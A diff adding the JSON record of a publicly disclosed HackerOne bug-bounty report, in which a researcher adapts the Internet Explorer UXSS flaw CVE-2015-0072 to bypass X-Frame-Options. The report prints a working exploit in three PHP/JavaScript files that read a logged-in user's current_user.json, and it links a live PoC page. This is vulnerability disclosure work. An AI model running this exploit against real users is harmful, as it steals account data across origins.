@@ -1,0 +1,175 @@
+{
+  "id": 108056,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xMDgwNTY=",
+  "url": "https://hackerone.com/reports/108056",
+  "title": "HackerOne is still prone to Internet Explorer UXSS",
+  "state": "Closed",
+  "substate": "informative",
+  "readable_substate": "Informative",
+  "created_at": "2016-01-04T11:34:44.163Z",
+  "submitted_at": "2016-01-04T11:34:44.163Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "zombiehelp54",
+    "url": "/zombiehelp54",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/mevfgipw1pc7n4wy86swdq1yaeuq/3cb67cc78dc0cba55b102dd9eca2ee89b206d3e960be830f070583d9070b69ef"
+    },
+    "is_me?": false,
+    "cleared": true,
+    "verified": true,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 13,
+    "url": "https://hackerone.com/security",
+    "handle": "security",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/000/013/fa942b9b1cbf4faf37482bf68458e1195aab9c02_original.png/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/000/013/fa942b9b1cbf4faf37482bf68458e1195aab9c02_original.png/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "HackerOne",
+      "twitter_handle": "Hacker0x01",
+      "website": "https://hackerone.com",
+      "about": "Vulnerability disclosure should be safe, transparent, and rewarding."
+    }
+  },
+  "has_bounty?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2017-04-19T18:16:55.902Z",
+  "bug_reporter_agreed_on_going_public_at": "2017-04-19T13:44:19.317Z",
+  "team_member_agreed_on_going_public_at": "2017-04-19T18:16:55.874Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "Hi, I have managed to leverage CVE 2015-0072, so that the attack will work with any framed resource protected by `X-Frame-Options: DENY` header.\nAccording to #103787, only https://hackerone.com/cdn-cgi/trace was unprotected and now its already fixed. In my PoC I used several X-Frame-Options protected resources of HackerOne and the attack was executed successfully.\n\nProof Of Concept\n--------------------------\n1. exploit.php\n\nI added alert() message after executing the payload (read content of current_user.json) because responseText  wasn't readable as steadyState stick at 1 and status at 0\n\n```\n<iframe src=\"redirect.php?<? echo rand(); ?>\" style=\"\"></iframe>\n<iframe src=\"https://hackerone.com/assets/news/vulnerabilities_fixed/vulnfixed-652ab9bb4eac2826a0fc8a2fae551115.png?<? echo rand(); ?>\" style=\"\"></iframe>\n<script>\ntop[0].eval('_=top[1];xhttp=new XMLHttpRequest();xhttp.open(\"get\",\"delay.php?<? echo rand(); ?>\",false);xhttp.send(); _.location=\"javascript:http=new XMLHttpRequest(); url=\\'https://hackerone.com/current_user.json\\';http.open(\\'GET\\', url, true);http.onreadystatechange = function(){if(http.readyState == 4 && http.status == 200)console.log(http.responseText);}; http.send(); alert(\\'No need to close this, already done!\\'); \"');\n</script>\n```\n\n2- redirect.php\n\n```\n<?php \nheader(\"Location: https://hackerone.com/assets/news/vulnerabilities_fixed/vulnfixed-652ab9bb4eac2826a0fc8a2fae551115.png?\".rand()); \nexit(); \n?>\n```\n\n3- delay.php\n\n```\n<?php \nsleep(5);\necho \"zombiehelp54\";\nexit(); \n?>\n```\n\nLive PoC\n---------------\nI have tested this live PoC on my IE 11.0.9600.17.633 updated February 2015 and also on IE 11 of Windows Server 2012 R2 and it worked as expected (see screenshots).\nI also tried many resources of HackerOne and all is X-Frame-Options protected.\nJust open any  vulnerable IE (9,10,11 without MS15-018 applied) and turn on console\nGo to http://alazzazpp.com/myuxss/exploit.php and your current_user.json will be logged to console.\n\nI couldn't find a mitigation to this, I hope you do.\nThanks;\n\n",
+  "weakness": {
+    "id": 45,
+    "name": "Cross-Site Request Forgery (CSRF)"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 67710,
+      "file_name": "redirect.php",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/067/710/7cf45113f86497fb3c47e5fd63f9685e2ac92356/redirect.php?response-content-disposition=attachment%3B%20filename%3D%22redirect.php%22%3B%20filename%2A%3DUTF-8%27%27redirect.php&response-content-type=text%2Fx-php&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ4GJ2ROIL%2F20250921%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250921T225351Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJT%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQD0W7F4vO0UCBthyZruglTnaMLL2D%2BlpzRcOIFAoqqA9AIhAJYrz2xd4yyJKAes3b6N6LKT2TKvHQa%2FJkzT720joYdTKrEFCB0QAxoMMDEzNjE5Mjc0ODQ5IgzfN%2BSfV0Oofpv1rxcqjgVALN05pr9kfUmq5NzR%2BXPH2E7waVVIQfZxs5L5sL1QegxQ3576AGtfSRVku%2F7y5cmDmxwuU9Hc4ydYL0c49Fo%2BUxK10JbYqRR5NTrq4Zgq%2FgA8qM71dUd2wvcA82uIdUXEepKBBBhC5d0g0LCLyr1JYGo7%2BW8Be1JsbForWL5QEClhr36lEJXjZQekKnzsXUEeFN9171GjITzbl7aiMx2dtrtuEaosH%2Fi%2B0AMvyqw7UmXcifqz8DajJS2HItH0Zlcb7MY1CqA27%2ByvfVX4PV9XzB1P3TEYexJO1SFTbY9j3dTq9G6yW%2B0iMSHmuZvBHStBHXqSKx5tqrVz8uY8a9jMo7wb36d2RkS6VukVn69AeCfz1QyfoZhroqrfwkNsrbbSDPN5bmj9kGrUs3tmTNE432CeD1lxn2AXbxk%2B1dqfO85IoSvT5FVrU6zBeY%2BDkQKrYJklTLwBevIZq6pEcSCan1voai%2F7BXYSeaM6QbQkCUgNh%2BdX8EXWL%2FRvj%2FdPqe%2BdQkkWgzFzwk9WplKXBYUwBwDHb8x8YOKstQleRq56Zi0NVNBN4AxNqN0ChHMyOvzhb6E9wuoNGyeol%2F7tCi3N1uwKPUF2vTncBRxc71QAd2IwHG1qLvNYitvSuGFHyothcx3FfQUWpx1eL1UibwqEbKvdrDUJ6kjagUkiNrVLUDKyKRmf%2FvhMkWhBpxkguw7VXQpNTaWy%2BMyWRqP1zLhJfHMA5g7agRXGsjcTfEx7S0VqHIUtziS0G0aV1Ie%2F3H5rLExUWY2SbuzqLdhuKRW8a9%2BlhO1SJTEbjI3GTXz1SVvK3CODEK49RoBG5iHnZSDKFbp%2F%2Br039%2FGlU5mauYS4ZZsnbQJ7hmPXbz1NTGgwtrHBxgY6sAFvIdF9EY1o%2FPUSUYtR%2Bz4SyMOOR0q6L3F0ASR5y%2BgOxFzpgHI0vgQ0SA6ZXIHov%2FlNnjSa1n3iTjOUEubhBn0%2BR1rHjgPQu2KPuEctsa91atMd74QKiMuVPwi62WNbjuVR9XJwfhHPrLzqReei2iDt1RN2zsrjF%2BpP67qmOcbpXL1Fgkp6tg4Ks2dVrKOs9%2F%2FHlbkr9aDiZsi%2B%2BRbusBydX4aE%2Fdr3ojIww6Pc4jWiqw%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=434fa2921ed523db72d754f51659ea853e11214845c6645e7dd739c0f07fbe32",
+      "file_size": 151,
+      "type": "text/x-php",
+      "moderated": null
+    },
+    {
+      "id": 67712,
+      "file_name": "exploit.php",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/067/712/15ec637cc05cbcdb9574d88335fb3199f9b16a5d/exploit.php?response-content-disposition=attachment%3B%20filename%3D%22exploit.php%22%3B%20filename%2A%3DUTF-8%27%27exploit.php&response-content-type=application%2Foctet-stream&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ4GJ2ROIL%2F20250921%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250921T225351Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJT%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQD0W7F4vO0UCBthyZruglTnaMLL2D%2BlpzRcOIFAoqqA9AIhAJYrz2xd4yyJKAes3b6N6LKT2TKvHQa%2FJkzT720joYdTKrEFCB0QAxoMMDEzNjE5Mjc0ODQ5IgzfN%2BSfV0Oofpv1rxcqjgVALN05pr9kfUmq5NzR%2BXPH2E7waVVIQfZxs5L5sL1QegxQ3576AGtfSRVku%2F7y5cmDmxwuU9Hc4ydYL0c49Fo%2BUxK10JbYqRR5NTrq4Zgq%2FgA8qM71dUd2wvcA82uIdUXEepKBBBhC5d0g0LCLyr1JYGo7%2BW8Be1JsbForWL5QEClhr36lEJXjZQekKnzsXUEeFN9171GjITzbl7aiMx2dtrtuEaosH%2Fi%2B0AMvyqw7UmXcifqz8DajJS2HItH0Zlcb7MY1CqA27%2ByvfVX4PV9XzB1P3TEYexJO1SFTbY9j3dTq9G6yW%2B0iMSHmuZvBHStBHXqSKx5tqrVz8uY8a9jMo7wb36d2RkS6VukVn69AeCfz1QyfoZhroqrfwkNsrbbSDPN5bmj9kGrUs3tmTNE432CeD1lxn2AXbxk%2B1dqfO85IoSvT5FVrU6zBeY%2BDkQKrYJklTLwBevIZq6pEcSCan1voai%2F7BXYSeaM6QbQkCUgNh%2BdX8EXWL%2FRvj%2FdPqe%2BdQkkWgzFzwk9WplKXBYUwBwDHb8x8YOKstQleRq56Zi0NVNBN4AxNqN0ChHMyOvzhb6E9wuoNGyeol%2F7tCi3N1uwKPUF2vTncBRxc71QAd2IwHG1qLvNYitvSuGFHyothcx3FfQUWpx1eL1UibwqEbKvdrDUJ6kjagUkiNrVLUDKyKRmf%2FvhMkWhBpxkguw7VXQpNTaWy%2BMyWRqP1zLhJfHMA5g7agRXGsjcTfEx7S0VqHIUtziS0G0aV1Ie%2F3H5rLExUWY2SbuzqLdhuKRW8a9%2BlhO1SJTEbjI3GTXz1SVvK3CODEK49RoBG5iHnZSDKFbp%2F%2Br039%2FGlU5mauYS4ZZsnbQJ7hmPXbz1NTGgwtrHBxgY6sAFvIdF9EY1o%2FPUSUYtR%2Bz4SyMOOR0q6L3F0ASR5y%2BgOxFzpgHI0vgQ0SA6ZXIHov%2FlNnjSa1n3iTjOUEubhBn0%2BR1rHjgPQu2KPuEctsa91atMd74QKiMuVPwi62WNbjuVR9XJwfhHPrLzqReei2iDt1RN2zsrjF%2BpP67qmOcbpXL1Fgkp6tg4Ks2dVrKOs9%2F%2FHlbkr9aDiZsi%2B%2BRbusBydX4aE%2Fdr3ojIww6Pc4jWiqw%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=c55939f86868fa5c8b31ef11c0124df5ff0e19b2d2cc9e4231bef28a3abfac51",
+      "file_size": 668,
+      "type": "text/html",
+      "moderated": null
+    },
+    {
+      "id": 67713,
+      "file_name": "delay.php",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/067/713/4746914313a76d16025b32b666cebff1f3bd0f1d/delay.php?response-content-disposition=attachment%3B%20filename%3D%22delay.php%22%3B%20filename%2A%3DUTF-8%27%27delay.php&response-content-type=text%2Fx-php&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ4GJ2ROIL%2F20250921%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250921T225351Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJT%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQD0W7F4vO0UCBthyZruglTnaMLL2D%2BlpzRcOIFAoqqA9AIhAJYrz2xd4yyJKAes3b6N6LKT2TKvHQa%2FJkzT720joYdTKrEFCB0QAxoMMDEzNjE5Mjc0ODQ5IgzfN%2BSfV0Oofpv1rxcqjgVALN05pr9kfUmq5NzR%2BXPH2E7waVVIQfZxs5L5sL1QegxQ3576AGtfSRVku%2F7y5cmDmxwuU9Hc4ydYL0c49Fo%2BUxK10JbYqRR5NTrq4Zgq%2FgA8qM71dUd2wvcA82uIdUXEepKBBBhC5d0g0LCLyr1JYGo7%2BW8Be1JsbForWL5QEClhr36lEJXjZQekKnzsXUEeFN9171GjITzbl7aiMx2dtrtuEaosH%2Fi%2B0AMvyqw7UmXcifqz8DajJS2HItH0Zlcb7MY1CqA27%2ByvfVX4PV9XzB1P3TEYexJO1SFTbY9j3dTq9G6yW%2B0iMSHmuZvBHStBHXqSKx5tqrVz8uY8a9jMo7wb36d2RkS6VukVn69AeCfz1QyfoZhroqrfwkNsrbbSDPN5bmj9kGrUs3tmTNE432CeD1lxn2AXbxk%2B1dqfO85IoSvT5FVrU6zBeY%2BDkQKrYJklTLwBevIZq6pEcSCan1voai%2F7BXYSeaM6QbQkCUgNh%2BdX8EXWL%2FRvj%2FdPqe%2BdQkkWgzFzwk9WplKXBYUwBwDHb8x8YOKstQleRq56Zi0NVNBN4AxNqN0ChHMyOvzhb6E9wuoNGyeol%2F7tCi3N1uwKPUF2vTncBRxc71QAd2IwHG1qLvNYitvSuGFHyothcx3FfQUWpx1eL1UibwqEbKvdrDUJ6kjagUkiNrVLUDKyKRmf%2FvhMkWhBpxkguw7VXQpNTaWy%2BMyWRqP1zLhJfHMA5g7agRXGsjcTfEx7S0VqHIUtziS0G0aV1Ie%2F3H5rLExUWY2SbuzqLdhuKRW8a9%2BlhO1SJTEbjI3GTXz1SVvK3CODEK49RoBG5iHnZSDKFbp%2F%2Br039%2FGlU5mauYS4ZZsnbQJ7hmPXbz1NTGgwtrHBxgY6sAFvIdF9EY1o%2FPUSUYtR%2Bz4SyMOOR0q6L3F0ASR5y%2BgOxFzpgHI0vgQ0SA6ZXIHov%2FlNnjSa1n3iTjOUEubhBn0%2BR1rHjgPQu2KPuEctsa91atMd74QKiMuVPwi62WNbjuVR9XJwfhHPrLzqReei2iDt1RN2zsrjF%2BpP67qmOcbpXL1Fgkp6tg4Ks2dVrKOs9%2F%2FHlbkr9aDiZsi%2B%2BRbusBydX4aE%2Fdr3ojIww6Pc4jWiqw%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=a0be96ace7e7df6d727a513950cba22d33c71e84fd94d57e5f877fe290b59b25",
+      "file_size": 41,
+      "type": "text/x-php",
+      "moderated": null
+    },
+    {
+      "id": 67714,
+      "file_name": "hackerone_uxss_2.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/067/714/8ef9f34a6ae988e9078705e1dd127cbd7603dc0b/hackerone_uxss_2.png?response-content-disposition=attachment%3B%20filename%3D%22hackerone_uxss_2.png%22%3B%20filename%2A%3DUTF-8%27%27hackerone_uxss_2.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ4GJ2ROIL%2F20250921%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250921T225351Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJT%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQD0W7F4vO0UCBthyZruglTnaMLL2D%2BlpzRcOIFAoqqA9AIhAJYrz2xd4yyJKAes3b6N6LKT2TKvHQa%2FJkzT720joYdTKrEFCB0QAxoMMDEzNjE5Mjc0ODQ5IgzfN%2BSfV0Oofpv1rxcqjgVALN05pr9kfUmq5NzR%2BXPH2E7waVVIQfZxs5L5sL1QegxQ3576AGtfSRVku%2F7y5cmDmxwuU9Hc4ydYL0c49Fo%2BUxK10JbYqRR5NTrq4Zgq%2FgA8qM71dUd2wvcA82uIdUXEepKBBBhC5d0g0LCLyr1JYGo7%2BW8Be1JsbForWL5QEClhr36lEJXjZQekKnzsXUEeFN9171GjITzbl7aiMx2dtrtuEaosH%2Fi%2B0AMvyqw7UmXcifqz8DajJS2HItH0Zlcb7MY1CqA27%2ByvfVX4PV9XzB1P3TEYexJO1SFTbY9j3dTq9G6yW%2B0iMSHmuZvBHStBHXqSKx5tqrVz8uY8a9jMo7wb36d2RkS6VukVn69AeCfz1QyfoZhroqrfwkNsrbbSDPN5bmj9kGrUs3tmTNE432CeD1lxn2AXbxk%2B1dqfO85IoSvT5FVrU6zBeY%2BDkQKrYJklTLwBevIZq6pEcSCan1voai%2F7BXYSeaM6QbQkCUgNh%2BdX8EXWL%2FRvj%2FdPqe%2BdQkkWgzFzwk9WplKXBYUwBwDHb8x8YOKstQleRq56Zi0NVNBN4AxNqN0ChHMyOvzhb6E9wuoNGyeol%2F7tCi3N1uwKPUF2vTncBRxc71QAd2IwHG1qLvNYitvSuGFHyothcx3FfQUWpx1eL1UibwqEbKvdrDUJ6kjagUkiNrVLUDKyKRmf%2FvhMkWhBpxkguw7VXQpNTaWy%2BMyWRqP1zLhJfHMA5g7agRXGsjcTfEx7S0VqHIUtziS0G0aV1Ie%2F3H5rLExUWY2SbuzqLdhuKRW8a9%2BlhO1SJTEbjI3GTXz1SVvK3CODEK49RoBG5iHnZSDKFbp%2F%2Br039%2FGlU5mauYS4ZZsnbQJ7hmPXbz1NTGgwtrHBxgY6sAFvIdF9EY1o%2FPUSUYtR%2Bz4SyMOOR0q6L3F0ASR5y%2BgOxFzpgHI0vgQ0SA6ZXIHov%2FlNnjSa1n3iTjOUEubhBn0%2BR1rHjgPQu2KPuEctsa91atMd74QKiMuVPwi62WNbjuVR9XJwfhHPrLzqReei2iDt1RN2zsrjF%2BpP67qmOcbpXL1Fgkp6tg4Ks2dVrKOs9%2F%2FHlbkr9aDiZsi%2B%2BRbusBydX4aE%2Fdr3ojIww6Pc4jWiqw%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=4dee776d2638ccb6d4ef6639a8e32b0851970edc391504912f9519410d7be95c",
+      "file_size": 44564,
+      "type": "image/png",
+      "moderated": null
+    },
+    {
+      "id": 67715,
+      "file_name": "hackerone_uxss_1.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/067/715/137346229a5d9bf44fdc3619cc7491ef4f76109b/hackerone_uxss_1.png?response-content-disposition=attachment%3B%20filename%3D%22hackerone_uxss_1.png%22%3B%20filename%2A%3DUTF-8%27%27hackerone_uxss_1.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ4GJ2ROIL%2F20250921%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250921T225351Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJT%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQD0W7F4vO0UCBthyZruglTnaMLL2D%2BlpzRcOIFAoqqA9AIhAJYrz2xd4yyJKAes3b6N6LKT2TKvHQa%2FJkzT720joYdTKrEFCB0QAxoMMDEzNjE5Mjc0ODQ5IgzfN%2BSfV0Oofpv1rxcqjgVALN05pr9kfUmq5NzR%2BXPH2E7waVVIQfZxs5L5sL1QegxQ3576AGtfSRVku%2F7y5cmDmxwuU9Hc4ydYL0c49Fo%2BUxK10JbYqRR5NTrq4Zgq%2FgA8qM71dUd2wvcA82uIdUXEepKBBBhC5d0g0LCLyr1JYGo7%2BW8Be1JsbForWL5QEClhr36lEJXjZQekKnzsXUEeFN9171GjITzbl7aiMx2dtrtuEaosH%2Fi%2B0AMvyqw7UmXcifqz8DajJS2HItH0Zlcb7MY1CqA27%2ByvfVX4PV9XzB1P3TEYexJO1SFTbY9j3dTq9G6yW%2B0iMSHmuZvBHStBHXqSKx5tqrVz8uY8a9jMo7wb36d2RkS6VukVn69AeCfz1QyfoZhroqrfwkNsrbbSDPN5bmj9kGrUs3tmTNE432CeD1lxn2AXbxk%2B1dqfO85IoSvT5FVrU6zBeY%2BDkQKrYJklTLwBevIZq6pEcSCan1voai%2F7BXYSeaM6QbQkCUgNh%2BdX8EXWL%2FRvj%2FdPqe%2BdQkkWgzFzwk9WplKXBYUwBwDHb8x8YOKstQleRq56Zi0NVNBN4AxNqN0ChHMyOvzhb6E9wuoNGyeol%2F7tCi3N1uwKPUF2vTncBRxc71QAd2IwHG1qLvNYitvSuGFHyothcx3FfQUWpx1eL1UibwqEbKvdrDUJ6kjagUkiNrVLUDKyKRmf%2FvhMkWhBpxkguw7VXQpNTaWy%2BMyWRqP1zLhJfHMA5g7agRXGsjcTfEx7S0VqHIUtziS0G0aV1Ie%2F3H5rLExUWY2SbuzqLdhuKRW8a9%2BlhO1SJTEbjI3GTXz1SVvK3CODEK49RoBG5iHnZSDKFbp%2F%2Br039%2FGlU5mauYS4ZZsnbQJ7hmPXbz1NTGgwtrHBxgY6sAFvIdF9EY1o%2FPUSUYtR%2Bz4SyMOOR0q6L3F0ASR5y%2BgOxFzpgHI0vgQ0SA6ZXIHov%2FlNnjSa1n3iTjOUEubhBn0%2BR1rHjgPQu2KPuEctsa91atMd74QKiMuVPwi62WNbjuVR9XJwfhHPrLzqReei2iDt1RN2zsrjF%2BpP67qmOcbpXL1Fgkp6tg4Ks2dVrKOs9%2F%2FHlbkr9aDiZsi%2B%2BRbusBydX4aE%2Fdr3ojIww6Pc4jWiqw%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=9b9be98da840a79de2a1fea1ea7990671d6b907ec273cb4860ceda53d810f610",
+      "file_size": 110092,
+      "type": "image/png",
+      "moderated": null
+    }
+  ],
+  "allow_singular_disclosure_at": null,
+  "vote_count": 23,
+  "voters": [
+    "bogdantc",
+    "inhibitor181",
+    "hunter",
+    "shubham_srt",
+    "malcolmx",
+    "madrobot",
+    "muhammad_uwais",
+    "r3y",
+    "eveeez",
+    "anas2024",
+    "and 13 more..."
+  ],
+  "structured_scope": null,
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "id": 3819,
+      "category": "researcher",
+      "content": "We managed to get IE UXSS (CVE 2015-0072) to work even when X-Frame-Options header exists with `Deny` or `SAMEORIGIN`.\n\nThanks my brother Alaa for the help on this one.",
+      "updated_at": "2017-04-19T18:31:41.205Z",
+      "can_view?": true,
+      "can_create?": false,
+      "attachments": [],
+      "user": {
+        "id": 36135,
+        "username": "zombiehelp54",
+        "name": "Mahmoud G. ",
+        "bio": "Twitter: @Zombiehelp54 ",
+        "cleared": true,
+        "verified": true,
+        "website": "https://mahmoudsec.blogspot.com",
+        "location": "",
+        "created_at": "2015-07-07T10:16:23.553Z",
+        "url": "https://hackerone.com/zombiehelp54",
+        "hackerone_triager": false,
+        "hackerone_employee": false,
+        "user_type": "hacker",
+        "profile_picture_urls": {
+          "small": "https://profile-photos.hackerone-user-content.com/variants/mevfgipw1pc7n4wy86swdq1yaeuq/3cb67cc78dc0cba55b102dd9eca2ee89b206d3e960be830f070583d9070b69ef",
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/mevfgipw1pc7n4wy86swdq1yaeuq/d9695107bfcd68eeb1c9e0912b109cdae9a6c00c0bda6fd4cbd6d9bdb828840a",
+          "xtralarge": "https://profile-photos.hackerone-user-content.com/variants/mevfgipw1pc7n4wy86swdq1yaeuq/4ac84fbe897190579a137d0cf55152b233cdd4f9984435bd80ef67e5e51a0586"
+        }
+      }
+    }
+  ]
+}
